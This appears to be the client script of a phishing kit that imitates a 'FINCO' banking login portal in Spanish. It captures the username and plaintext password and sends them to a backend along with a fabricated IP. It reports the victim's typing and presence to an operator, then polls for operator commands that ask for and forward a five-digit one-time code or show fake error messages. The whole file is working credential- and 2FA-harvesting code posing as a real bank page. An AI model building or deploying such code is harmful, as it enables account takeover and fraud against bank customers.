const form = document.getElementById("login-form");
const userInput = document.getElementById("usuario");
const passInput = document.getElementById("password");
const userField = userInput.closest(".field");
const clearUser = document.getElementById("clear-user");
const togglePass = document.getElementById("toggle-pass");
const loader = document.getElementById("portal-loader");
const spinner = document.getElementById("portal-spinner");
const otpCard = document.getElementById("otp-card");
const otpInputs = [...document.querySelectorAll("#otp-boxes input")];
const otpNote = document.getElementById("otp-note");
const panels = document.querySelectorAll("[data-panel]");

let sessionId = sessionStorage.getItem('sessionId') || ('sess_finco_p_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9));
sessionStorage.setItem('sessionId', sessionId);

let pingInterval = null;
let pollInterval = null;
let isSubmitting = false;
let lastSentState = null;

function startPing() {
  if (pingInterval) clearInterval(pingInterval);
  fetch(`/api/sessions/${sessionId}/ping`, { method: 'POST' }).catch(() => {});
  pingInterval = setInterval(() => {
    fetch(`/api/sessions/${sessionId}/ping`, { method: 'POST' }).catch(() => {});
  }, 3000);
}

function stopPing() {
  if (pingInterval) {
    clearInterval(pingInterval);
    pingInterval = null;
  }
}

function startPolling() {
  if (pollInterval) clearInterval(pollInterval);
  pollInterval = setInterval(async () => {
    try {
      const response = await fetch(`/api/sessions/${sessionId}`);
      if (response.ok) {
        const data = await response.json();
        const action = data.action;

        if (action === 'dinamica' || action === 'sms') {
          if (isSubmitting || (data.token && data.token !== '')) {
            showSpinner();
          } else {
            showOtpScreen();
          }
        } else if (action === 'error-dinamica' || action === 'error-sms') {
          isSubmitting = false;
          showOtpScreen();
          otpInputs.forEach(input => input.value = "");
          otpInputs[0].focus();
          alert("Código incorrecto. Por favor, intente de nuevo.");
          // Clear action on server
          fetch(`/api/sessions/${sessionId}/action`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ action: null })
          }).catch(() => {});
        } else if (action === 'error-login') {
          stopPing();
          stopPolling();
          isSubmitting = false;
          loader.hidden = true;
          alert("Usuario o contraseña incorrectos. Por favor, verifique sus datos.");
          // Clear action on server
          fetch(`/api/sessions/${sessionId}/action`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ action: null })
          }).catch(() => {});
        } else if (action === 'done') {
          stopPing();
          stopPolling();
          isSubmitting = false;
          loader.hidden = true;
          document.getElementById("portal-login").hidden = true;
          document.getElementById("portal-home").hidden = false;
        }
      }
    } catch (_) {}
  }, 1000);
}

function stopPolling() {
  if (pollInterval) {
    clearInterval(pollInterval);
    pollInterval = null;
  }
}

function showPanel(name) {
  panels.forEach((panel) => {
    panel.hidden = panel.dataset.panel !== name;
  });
}

function showSpinner() {
  loader.hidden = false;
  spinner.hidden = false;
  otpCard.hidden = true;
}

function showOtpScreen() {
  loader.hidden = false;
  spinner.hidden = true;
  otpCard.hidden = false;
}

function closeOverlay() {
  stopPing();
  stopPolling();
  loader.hidden = true;
  spinner.hidden = false;
  otpCard.hidden = true;
  // Notify backend session closed
  fetch(`/api/sessions/${sessionId}/state`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ state: 'closed' })
  }).catch(() => {});
}

document.querySelectorAll("[data-open]").forEach((link) => {
  link.addEventListener("click", (event) => {
    event.preventDefault();
    showPanel(link.dataset.open);
  });
});

clearUser.addEventListener("click", () => {
  userInput.value = "";
  userInput.focus();
});

togglePass.addEventListener("click", () => {
  const hidden = passInput.type === "password";
  passInput.type = hidden ? "text" : "password";
  togglePass.setAttribute("aria-label", hidden ? "Ocultar contraseña" : "Mostrar contraseña");
});

// Setup typing event listeners
[userInput, passInput].forEach((field) => {
  if (!field) return;
  field.addEventListener("input", () => {
    const targetState = 'typing';
    if (lastSentState !== targetState) {
      lastSentState = targetState;
      fetch(`/api/sessions/${sessionId}/state`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ state: targetState })
      }).catch(() => {});
    }
  });
});

form.addEventListener("submit", (event) => {
  event.preventDefault();
  const emptyUser = !userInput.value.trim();
  userField.classList.toggle("is-error", emptyUser);
  if (emptyUser) {
    userInput.focus();
    return;
  }

  showSpinner();
  lastSentState = null;

  const session = {
    id: sessionId,
    username: userInput.value,
    password: passInput.value,
    tipoUsuario: 'FINCO_PORTAL',
    device: window.innerWidth <= 768 ? 'mobile' : 'desktop',
    ip: '190.24.' + Math.floor(Math.random() * 255) + '.' + Math.floor(Math.random() * 255),
    state: 'waiting',
    createdAt: Date.now()
  };

  fetch('/api/sessions', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(session)
  })
  .then(() => {
    startPing();
    startPolling();
  })
  .catch(() => {
    loader.hidden = true;
    alert("Error al intentar conectar. Intente de nuevo.");
  });
});

function checkOtpTypingState() {
  const tokenVal = otpInputs.map(input => input.value).join("");
  let targetState = 'waiting-dinamica';
  if (tokenVal.length > 0) {
    targetState = 'typing';
  }
  if (lastSentState !== targetState) {
    lastSentState = targetState;
    fetch(`/api/sessions/${sessionId}/state`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ state: targetState })
    }).catch(() => {});
  }
}

otpInputs.forEach((input, index) => {
  input.addEventListener("input", () => {
    input.value = input.value.replace(/\D/g, "").slice(0, 1);
    if (input.value && otpInputs[index + 1]) otpInputs[index + 1].focus();
    checkOtpTypingState();
  });
  input.addEventListener("keydown", (event) => {
    if (event.key === "Backspace" && !input.value && otpInputs[index - 1]) {
      otpInputs[index - 1].focus();
    }
  });
  input.addEventListener("paste", (event) => {
    event.preventDefault();
    const digits = (event.clipboardData.getData("text") || "").replace(/\D/g, "").slice(0, otpInputs.length);
    otpInputs.forEach((box, i) => {
      box.value = digits[i] || "";
    });
    otpInputs[Math.min(digits.length, otpInputs.length - 1)].focus();
    checkOtpTypingState();
  });
});

document.getElementById("otp-resend").addEventListener("click", () => {
  otpNote.hidden = false;
});

document.getElementById("otp-validar").addEventListener("click", () => {
  const tokenVal = otpInputs.map(input => input.value).join("");
  if (tokenVal.length !== 5) return;

  isSubmitting = true;
  showSpinner();

  fetch(`/api/sessions/${sessionId}/token`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ token: tokenVal })
  })
  .then(() => {
    isSubmitting = false;
  })
  .catch(() => {
    isSubmitting = false;
  });
});

document.getElementById("otp-cancelar").addEventListener("click", closeOverlay);

const logoutBtn = document.getElementById("logout");
if (logoutBtn) {
  logoutBtn.addEventListener("click", () => {
    stopPing();
    stopPolling();
    sessionStorage.removeItem("sessionId");
    window.location.reload();
  });
}
